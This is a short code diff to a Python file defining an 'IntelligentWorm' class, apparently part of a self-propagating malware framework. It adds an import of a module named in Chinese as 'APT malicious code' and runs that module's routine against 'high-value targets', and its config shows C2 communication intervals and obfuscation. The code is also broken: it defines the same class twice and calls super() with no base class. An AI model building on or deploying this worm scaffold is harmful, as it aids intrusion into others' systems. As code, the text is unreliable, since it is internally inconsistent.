@@ -35,6 +35,18 @@ from collections import deque
 from 模仿人类的思考方式 import HumanLikeThinker
 from 自动写代码 import AutoCoder
 
+from APT恶意代码 import APTModule
+
+
+class IntelligentWorm:
+    def __init__(self):
+        self.apt = APTModule()  # 初始化APT模块
+
+    def run(self):
+        if self._is_high_value_target():
+            self.apt.apt_main()  # 对高价值目标启用APT模式
+        else:
+            super().run()  # 普通模式
 
 class IntelligentWorm:
     def __init__(self):
@@ -52,7 +64,7 @@ class IntelligentWorm:
             'max_attempts': 3,  # 最大重试次数
             'c2_interval': (300, 3600),  # C2通信间隔
             'obfuscation': True,  # 是否启用混淆
-            'learning_rate': 0.1,  # 学习率
+            'learning_rate': 1,  # 学习率
             'risk_tolerance': 0.5  # 风险容忍度(0-1)
         }
 
